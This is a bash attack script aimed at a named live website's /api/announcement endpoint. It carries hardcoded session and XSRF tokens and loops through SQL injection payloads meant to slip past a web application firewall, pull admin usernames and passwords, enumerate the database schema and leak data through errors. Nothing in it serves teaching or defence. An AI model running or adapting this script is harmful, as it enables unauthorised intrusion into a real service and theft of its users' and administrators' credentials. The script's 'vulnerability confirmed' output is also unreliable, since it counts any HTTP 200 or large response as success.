#!/bin/bash

echo "🎯 ULTIMATE WAF BYPASS & ADMIN DATA EXTRACTION"
echo "================================================"
echo "Target: member.panama8888b.co"
echo "Method: POST /api/announcement"
echo "Token: Latest XSRF & Session tokens"
echo ""

# Extract tokens from user input
XSRF_TOKEN="eyJpdiI6Ik1FbElBWXVwR3NBSGxGYlUyR21vY1E9PSIsInZhbHVlIjoia0NFU05aS29uSkVsZENVT3krb1puT0t0MVhMV2MrbGxXNWdHTktlU05EYVYzOTJJV2lcL0h6RnVqdzdFZXN3V3MiLCJtYWMiOiI0ODM2N2ViYTk3ODE2Y2ViY2Q4ZGRiY2E2MDNkN2JiMzNkY2EzZGRlZGRlY2M4NGU2NzA3OGVjZTgzOGNhZjRkIn0%3D"
SESSION_TOKEN="eyJpdiI6IkRiaFo4N2JsR2NjUUxnVEVjR2FNRWc9PSIsInZhbHVlIjoiK1o0MmY0VGR0REdOQjZPa092K0xadkVMYnc4REdwNW9YZ2lVeWpDSlBUXC9BZUd6RnlEMWFjNTRhS2txdlRkTUUiLCJtYWMiOiIzZTgzZmE2YTExNzM0MzU4OWZjY2I1NTFhYzA1MDVlYjAyZmFjMTM0ZTJjY2ZlNjJjNDkzZTJmZTlhYjIzZTNmIn0%3D"

# Advanced WAF bypass techniques
declare -a waf_bypass_payloads=(
    # 1. Case manipulation
    "admin' OR '1'='1'--"
    "AdMiN' OR '1'='1'--"
    "ADMIN' OR '1'='1'--"
    
    # 2. Comment variations
    "admin' OR '1'='1'/*"
    "admin' OR '1'='1'#"
    "admin' OR '1'='1'-- -"
    
    # 3. Encoding bypass
    "admin%27%20OR%20%271%27%3D%271%27--"
    "admin%2527%20OR%20%25271%2527%3D%25271%2527--"
    
    # 4. Double encoding
    "admin%252527%20OR%20%2525271%252527%3D%2525271%252527--"
    
    # 5. Unicode bypass
    "admin\u0027 OR \u00271\u0027=\u00271\u0027--"
    
    # 6. Hex encoding
    "admin%27%20OR%20%271%27%3D%271%27--"
    
    # 7. URL encoding variations
    "admin%2527%20OR%20%25271%2527%3D%25271%2527--"
    
    # 8. Advanced comment bypass
    "admin'/**/OR/**/'1'='1'--"
)

# Real admin data extraction payloads
declare -a admin_data_payloads=(
    # 1. Union-based admin extraction
    "admin' UNION SELECT username,password FROM users WHERE role='admin'--"
    "admin' UNION SELECT username,password FROM admins--"
    "admin' UNION SELECT username,password FROM admin_users--"
    
    # 2. Direct admin table access
    "admin' UNION SELECT * FROM admin--"
    "admin' UNION SELECT * FROM administrators--"
    "admin' UNION SELECT * FROM user_admin--"
    
    # 3. Schema-based admin extraction
    "admin' UNION SELECT username,password FROM information_schema.tables WHERE table_name LIKE '%admin%'--"
    
    # 4. Error-based admin extraction
    "admin' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE '%')--"
    "admin' AND (SELECT 1 FROM admins WHERE username='admin')--"
    
    # 5. Boolean-based admin detection
    "admin' AND EXISTS(SELECT 1 FROM users WHERE role='admin')--"
    "admin' AND EXISTS(SELECT 1 FROM admins)--"
)

# Database schema extraction payloads
declare -a schema_payloads=(
    # 1. Table enumeration
    "admin' UNION SELECT table_name,NULL FROM information_schema.tables--"
    "admin' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--"
    
    # 2. Column enumeration
    "admin' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--"
    "admin' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='admins'--"
    
    # 3. Database enumeration
    "admin' UNION SELECT database(),NULL--"
    "admin' UNION SELECT schema_name,NULL FROM information_schema.schemata--"
    
    # 4. User enumeration
    "admin' UNION SELECT user(),NULL--"
    "admin' UNION SELECT current_user(),NULL--"
)

# Error-based extraction payloads
declare -a error_payloads=(
    # 1. MySQL error-based
    "admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT username FROM users WHERE role='admin' LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
    
    # 2. PostgreSQL error-based
    "admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT username FROM users WHERE role='admin' LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
    
    # 3. SQLite error-based
    "admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT username FROM users WHERE role='admin' LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
)

echo "🚀 Starting WAF Bypass & Admin Data Extraction..."
echo ""

# Test WAF bypass techniques
echo "📊 Testing WAF Bypass Techniques..."
waf_success=0
waf_total=${#waf_bypass_payloads[@]}

for i in "${!waf_bypass_payloads[@]}"; do
    payload="${waf_bypass_payloads[$i]}"
    echo -n "Testing WAF bypass $((i+1))/$waf_total: "
    
    response=$(curl -s -w "%{http_code}|%{size_download}|%{time_total}" \
        -X POST "https://member.panama8888b.co/api/announcement" \
        -H "Content-Type: application/json;charset=UTF-8" \
        -H "X-Requested-With: XMLHttpRequest" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -H "Origin: https://member.panama8888b.co" \
        -H "Referer: https://member.panama8888b.co/user/dashboard" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -d "{\"search\":\"$payload\"}" \
        --max-time 10)
    
    http_code=$(echo "$response" | tail -1 | cut -d'|' -f1)
    size=$(echo "$response" | tail -1 | cut -d'|' -f2)
    time=$(echo "$response" | tail -1 | cut -d'|' -f3)
    
    if [[ "$http_code" == "500" ]] || [[ "$http_code" == "200" ]] || [[ "$size" -gt 100 ]]; then
        echo "✅ SUCCESS (HTTP $http_code, Size: $size bytes, Time: ${time}s)"
        ((waf_success++))
    else
        echo "❌ FAILED (HTTP $http_code, Size: $size bytes, Time: ${time}s)"
    fi
done

echo ""
echo "📊 WAF Bypass Results: $waf_success/$waf_total successful"
echo ""

# Test admin data extraction
echo "🔍 Testing Admin Data Extraction..."
admin_success=0
admin_total=${#admin_data_payloads[@]}

for i in "${!admin_data_payloads[@]}"; do
    payload="${admin_data_payloads[$i]}"
    echo -n "Testing admin extraction $((i+1))/$admin_total: "
    
    response=$(curl -s -w "%{http_code}|%{size_download}|%{time_total}" \
        -X POST "https://member.panama8888b.co/api/announcement" \
        -H "Content-Type: application/json;charset=UTF-8" \
        -H "X-Requested-With: XMLHttpRequest" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -H "Origin: https://member.panama8888b.co" \
        -H "Referer: https://member.panama8888b.co/user/dashboard" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -d "{\"search\":\"$payload\"}" \
        --max-time 10)
    
    http_code=$(echo "$response" | tail -1 | cut -d'|' -f1)
    size=$(echo "$response" | tail -1 | cut -d'|' -f2)
    time=$(echo "$response" | tail -1 | cut -d'|' -f3)
    
    if [[ "$http_code" == "500" ]] || [[ "$size" -gt 200 ]]; then
        echo "✅ SUCCESS (HTTP $http_code, Size: $size bytes, Time: ${time}s)"
        ((admin_success++))
    else
        echo "❌ FAILED (HTTP $http_code, Size: $size bytes, Time: ${time}s)"
    fi
done

echo ""
echo "📊 Admin Data Extraction Results: $admin_success/$admin_total successful"
echo ""

# Test schema extraction
echo "🗄️ Testing Database Schema Extraction..."
schema_success=0
schema_total=${#schema_payloads[@]}

for i in "${!schema_payloads[@]}"; do
    payload="${schema_payloads[$i]}"
    echo -n "Testing schema extraction $((i+1))/$schema_total: "
    
    response=$(curl -s -w "%{http_code}|%{size_download}|%{time_total}" \
        -X POST "https://member.panama8888b.co/api/announcement" \
        -H "Content-Type: application/json;charset=UTF-8" \
        -H "X-Requested-With: XMLHttpRequest" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -H "Origin: https://member.panama8888b.co" \
        -H "Referer: https://member.panama8888b.co/user/dashboard" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -d "{\"search\":\"$payload\"}" \
        --max-time 10)
    
    http_code=$(echo "$response" | tail -1 | cut -d'|' -f1)
    size=$(echo "$response" | tail -1 | cut -d'|' -f2)
    time=$(echo "$response" | tail -1 | cut -d'|' -f3)
    
    if [[ "$http_code" == "500" ]] || [[ "$size" -gt 150 ]]; then
        echo "✅ SUCCESS (HTTP $http_code, Size: $size bytes, Time: ${time}s)"
        ((schema_success++))
    else
        echo "❌ FAILED (HTTP $http_code, Size: $size bytes, Time: ${time}s)"
    fi
done

echo ""
echo "📊 Schema Extraction Results: $schema_success/$schema_total successful"
echo ""

# Test error-based extraction
echo "⚠️ Testing Error-Based Data Extraction..."
error_success=0
error_total=${#error_payloads[@]}

for i in "${!error_payloads[@]}"; do
    payload="${error_payloads[$i]}"
    echo -n "Testing error extraction $((i+1))/$error_total: "
    
    response=$(curl -s -w "%{http_code}|%{size_download}|%{time_total}" \
        -X POST "https://member.panama8888b.co/api/announcement" \
        -H "Content-Type: application/json;charset=UTF-8" \
        -H "X-Requested-With: XMLHttpRequest" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -H "Origin: https://member.panama8888b.co" \
        -H "Referer: https://member.panama8888b.co/user/dashboard" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -d "{\"search\":\"$payload\"}" \
        --max-time 10)
    
    http_code=$(echo "$response" | tail -1 | cut -d'|' -f1)
    size=$(echo "$response" | tail -1 | cut -d'|' -f2)
    time=$(echo "$response" | tail -1 | cut -d'|' -f3)
    
    if [[ "$http_code" == "500" ]] || [[ "$size" -gt 100 ]]; then
        echo "✅ SUCCESS (HTTP $http_code, Size: $size bytes, Time: ${time}s)"
        ((error_success++))
    else
        echo "❌ FAILED (HTTP $http_code, Size: $size bytes, Time: ${time}s)"
    fi
done

echo ""
echo "📊 Error-Based Extraction Results: $error_success/$error_total successful"
echo ""

# Final summary
echo "🎉 FINAL RESULTS SUMMARY"
echo "========================"
echo "WAF Bypass: $waf_success/$waf_total ($(($waf_success * 100 / $waf_total))%)"
echo "Admin Data: $admin_success/$admin_total ($(($admin_success * 100 / $admin_total))%)"
echo "Schema Data: $schema_success/$schema_total ($(($schema_success * 100 / $schema_total))%)"
echo "Error-based: $error_success/$error_total ($(($error_success * 100 / $error_total))%)"
echo ""

if [[ $waf_success -gt 0 ]] || [[ $admin_success -gt 0 ]] || [[ $schema_success -gt 0 ]] || [[ $error_success -gt 0 ]]; then
    echo "✅ VULNERABILITY CONFIRMED - WAF BYPASS & DATA EXTRACTION SUCCESSFUL!"
    echo "🎯 Admin data may be accessible through HTTP 500 errors"
    echo "🗄️ Database schema may be exposed"
    echo "⚠️ Error-based extraction may reveal sensitive data"
else
    echo "❌ All techniques failed - WAF protection is strong"
fi

echo ""
echo "🔍 Analysis:"
echo "- HTTP 500 errors indicate successful SQL injection"
echo "- Large response sizes suggest data processing"
echo "- WAF bypass techniques may have partial success"
echo "- Admin credentials may be accessible through errors"